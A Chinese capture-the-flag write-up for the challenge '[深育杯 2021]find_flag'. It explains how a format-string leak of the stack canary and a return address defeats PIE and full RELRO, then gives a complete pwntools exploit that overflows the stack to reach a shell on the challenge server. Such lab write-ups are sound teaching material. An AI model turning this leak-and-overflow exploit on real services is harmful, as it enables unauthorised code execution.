[深育杯 2021]find_flag

一、前言

第一次碰到保护全开的题目，记录一下

二、题目

保护全开，第一个平时遇见的都是部分RELRO，是GCC的默认设置，完整的RELRO使整个GOT表都是可读，但是无法修改，所以这就防护了我们通过劫持__stack_chk_fail函数覆盖GOT表地址，所以只能另寻别的方法，PIE程序地址随机化，不能再直接获取函数地址，需要泄露出一处地址，然后根据偏移计算其它函数地址。

到ida分析看一下

两处溢出点加上一个格式化字符串漏洞，很明显，第一次溢出是为了输出Canary的值，既然开启了PIE无法直接确定地址，但是返回地址是main函数中的地址，如果通过printf泄露出返回地址，然后减去偏移地址，就获得了程序的基址，那这样就可以通过基址+偏移获得其它所有的地址。

首先需要确定Canary的值和返回地址，利用printf函数的%n$p可以泄露出其内容，我们需要的就是找到格式化字符参数偏移。

gdb中调试，断到printf函数，查看堆栈

需要注意的是，这是一个64位程序，printf函数参数前6个参数是用寄存器传参，从左到右依此是rdi,rsi,rdx,rcx,r8,r9，所以计算偏移的时候，计算到rdi寄存器的距离再加上6，就是偏移，从图中可以看出，Canary偏移是17，main返回地址是19，所以参数分别是%17$p,%19$p。

三、EXP

from pwn import*

context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context(arch='amd64', os='linux')
sh = remote('node4.anna.nssctf.cn',28141)
elf = ELF('./pwn')
payload = b'%17$pbbbb%19$p'		#用bbbb间隔开，方便接收

sh.sendline(payload)

sh.recvuntil(b'you, ')

Canary = int(sh.recv(18),16)

sh.recvuntil(b'bbbb')
return_addr = int(sh.recv(14),16)
print(hex(Canary))
print(hex(return_addr))

base = return_addr - 0x146F			#减去偏移获得基址

shell_addr = base + 0x1228			

payload = (0x40-0x8)*b'a'+p64(Canary)+b'aaaaaaaa'+p64(shell_addr)

sh.recvuntil(b'else?')

sh.sendline(payload)

sh.interactive()
